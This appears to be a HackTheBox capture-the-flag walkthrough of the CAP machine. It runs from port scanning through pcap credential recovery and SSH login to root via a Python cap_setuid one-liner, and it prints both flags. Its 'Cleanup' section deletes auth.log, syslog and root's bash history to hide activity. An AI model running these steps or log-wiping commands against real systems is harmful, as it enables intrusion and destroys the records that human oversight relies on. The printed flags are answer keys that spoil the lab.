\# HackTheBox Walkthrough – CAP



\## 🧭 Introduction



This is my technical walkthrough of the HackTheBox machine \*\*CAP\*\*, focused on privilege escalation through Linux capabilities and binary analysis.

The goal was to gain user access, identify exploitable binaries, and escalate to root privileges.



---



\## 🔎 Initial Enumeration



\### ✅ Checking Host Availability

```bash

ping 10.10.10.245



✅ Full Port Scan with Nmap

nmap -p- -sV 10.10.10.245





\- -p- → scans all 65535 ports

\- -sV → detects service versions

Scan Results:

PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu

80/tcp open  http    Gunicorn







🌐 Web Exploration

Navigating to http://10.10.10.245, I found a webpage linked to the user Nathan. Clicking on "Security Snapshot" appended /data/<number> to the URL, allowing me to download .pcap files.



🧪 Packet Analysis with Wireshark

I downloaded /data/0.pcap and inspected the TCP stream using Wireshark. I discovered plaintext credentials:

Username: nathan

Password: Buck3tH4TF0RM3!







🔐 SSH Access

I attempted SSH login:

ssh nathan@10.10.10.245





After accepting the fingerprint and entering the password, I successfully gained shell access as Nathan.



🧾 User Flag

Listing Nathan’s home directory:

ls

cat user.txt





User Flag:

250a5a6a2c28aa53759e28c8fc160247







🔼 Privilege Escalation

🔍 Searching for SUID Binaries

find / -perm -4000 -type f 2>/dev/null





\- -perm -4000 → finds files with SUID bit set

\- -type f → restricts to regular files

\- 2>/dev/null → suppresses permission errors

🔍 Searching for Special Capabilities

getcap -r / 2>/dev/null





I found:

/usr/bin/python3.8 = cap\_setuid+ep





🔥 Exploiting Python Capabilities

python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'





This allowed me to spawn a root shell by leveraging cap\_setuid+ep.



🏁 Root Flag

Navigating to the root home directory:

cd /root

ls -la

cat root.txt





Root Flag:

66b199413df3f0853d37b6044e461036







🧹 Cleanup

To remove traces of my activity:

sudo rm /var/log/auth.log\*

sudo rm /var/log/syslog\*

sudo rm /root/.bash\_history\*







🧠 Conclusion

CAP was a great exercise in service enumeration, packet analysis, and privilege escalation via Linux capabilities. It reinforced the importance of inspecting .pcap files and understanding how capabilities like cap\_setuid+ep can be abused for root access.



🔗 Useful Resources

\- GTFOBins

\- Wireshark

\- HackTheBox – CAP



